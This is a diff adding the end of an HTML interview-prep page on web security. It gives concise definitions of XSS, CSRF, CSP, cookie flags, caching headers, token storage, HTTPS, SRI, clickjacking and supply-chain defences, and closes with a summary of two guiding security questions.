+  <dd>Persisted server-side and hits everyone (worst) / echoed from a URL param and needs a lure / never reaches the server — a client source flows into a client sink.</dd>
+
+  <dt>XSS fix, in order</dt>
+  <dd>Contextual output encoding → <code>textContent</code> over <code>innerHTML</code> → DOMPurify with an allowlist if you must render HTML → never <code>eval</code> → CSP as defence in depth.</dd>
+
+  <dt>Why isn't input sanitisation enough?</dt>
+  <dd>You don't know the output context at input time, it corrupts legitimate data, and data reaches storage through paths that skip your filter. Validate in, encode out.</dd>
+
+  <dt>Is React immune to XSS?</dt>
+  <dd>Safe by default (JSX sets text, not markup), not immune: <code>dangerouslySetInnerHTML</code>, <code>javascript:</code> in a user-supplied <code>href</code>, spreading unvalidated props, <code>ref</code> + direct DOM writes, and SSR state in a <code>&lt;script&gt;</code> tag.</dd>
+
+  <dt>When is <code>dangerouslySetInnerHTML</code> OK?</dt>
+  <dd>When the HTML is genuinely trusted, or has been through a real allowlist sanitiser — ideally at write time, stored in a separate field from the raw value.</dd>
+
+  <dt>CSRF</dt>
+  <dd>Browsers attach cookies by destination, not by initiator — so a request forged from another site rides the victim's session. The attacker never needs to read the response.</dd>
+
+  <dt>CSRF fixes</dt>
+  <dd><code>SameSite</code> cookies + a CSRF token (synchronizer or double-submit) + <code>Origin</code> checking + never GET for state changes.</dd>
+
+  <dt>Why does a CSRF token work?</dt>
+  <dd>The cookie is ambient, the token isn't — and SOP stops the attacker reading the token out of your page.</dd>
+
+  <dt>Does SameSite=Lax fully prevent CSRF?</dt>
+  <dd>No. It still permits top-level GET navigations, it's site- not origin-scoped (subdomains count), and browser defaults vary. Strong layer, not the only one.</dd>
+
+  <dt>XSS vs CSRF</dt>
+  <dd>XSS runs code in your origin (confidentiality + integrity). CSRF only triggers a request (integrity). XSS defeats every CSRF defence.</dd>
+
+  <dt>CSP</dt>
+  <dd>A server-declared allowlist of what may load and execute. <code>unsafe-inline</code>/<code>unsafe-eval</code> gut it; use per-request nonces or hashes, plus <code>strict-dynamic</code>. Roll out with report-only. Defence in depth, not an XSS fix.</dd>
+
+  <dt>Cookie flags</dt>
+  <dd><code>HttpOnly</code> (JS can't read it), <code>Secure</code> (HTTPS only), <code>SameSite</code> (cross-site sending), omit <code>Domain</code> to stay host-only, <code>Max-Age</code> for persistence, and the <code>__Host-</code> prefix to make it all enforceable.</dd>
+
+  <dt><code>no-cache</code> vs <code>no-store</code></dt>
+  <dd><code>no-cache</code> = store it but revalidate every time (cheap 304s). <code>no-store</code> = never write it down at all. "Check with me first" vs "don't write this down."</dd>
+
+  <dt>Caching pattern</dt>
+  <dd>Hashed asset filenames with <code>max-age=31536000, immutable</code>; <code>index.html</code> with <code>no-cache</code>. Authenticated responses get <code>private</code>/<code>no-store</code> + <code>Vary: Cookie</code>.</dd>
+
+  <dt>localStorage or cookies for a JWT?</dt>
+  <dd>localStorage: CSRF-immune but any XSS exfiltrates the token permanently. HttpOnly cookie: XSS can't read it but you must handle CSRF. Modern default — short-lived access token + HttpOnly <code>__Host-</code> refresh cookie with rotation.</dd>
+
+  <dt>Does HttpOnly make XSS not matter?</dt>
+  <dd>No. It blocks <em>reading</em> the token, not <em>using</em> it — script can still act as the user. It limits persistence and portability, not capability.</dd>
+
+  <dt>HTTPS</dt>
+  <dd>Confidentiality, integrity (the important one — HTTP lets intermediaries inject scripts into your page), and authentication. HSTS closes the first-request gap; mixed active content is blocked; service workers, geolocation and Web Crypto need a secure context.</dd>
+
+  <dt>Subresource Integrity</dt>
+  <dd>A hash on a <code>&lt;script&gt;</code>/<code>&lt;link&gt;</code> so a tampered CDN file won't execute. Needs <code>crossorigin</code>. Breaks on any legitimate update; useless for dynamic endpoints.</dd>
+
+  <dt>Clickjacking</dt>
+  <dd>Your page framed invisibly over a decoy so real clicks hit real buttons. Prevent with <code>frame-ancestors</code> (modern) and <code>X-Frame-Options</code> (legacy). Framebusting JS is bypassable.</dd>
+
+  <dt>Supply chain</dt>
+  <dd>Bundled dependencies execute in your users' browsers with your app's full privileges. Lockfiles + <code>npm ci</code>, audits, fewer deps, no install scripts, SRI, and a tight <code>connect-src</code> to block exfiltration.</dd>
+</dl>
+</div>
+
+<hr class="soft">
+
+<h3>One last thing</h3>
+
+<p>If you remember nothing else from all of this, remember the two questions from the very beginning, because every answer above hangs off one of them:</p>
+
+<p><strong>"Whose code is running in my page?"</strong> — XSS, CSP, SRI, Trusted Types, supply chain.</p>
+<p><strong>"Who is this request from, and who may read the answer?"</strong> — SOP, CORS, CSRF, cookies, clickjacking.</p>
+
+<p>An interviewer asking about security is rarely checking whether you memorised the nine <code>Cache-Control</code> directives. They're checking whether you understand that the browser is running mutually distrustful code from mutually distrustful parties, at the same time, holding all your credentials — and that every one of these mechanisms is a specific answer to a specific way that arrangement could go wrong.</p>
+
+<p>Once you're thinking in those terms, you'll be able to reason your way to an answer even for a mechanism you've never seen. Which is exactly the thing they're trying to find out. Good luck. 🔒</p>
+
+
+
+</div>
+</body>
+</html>
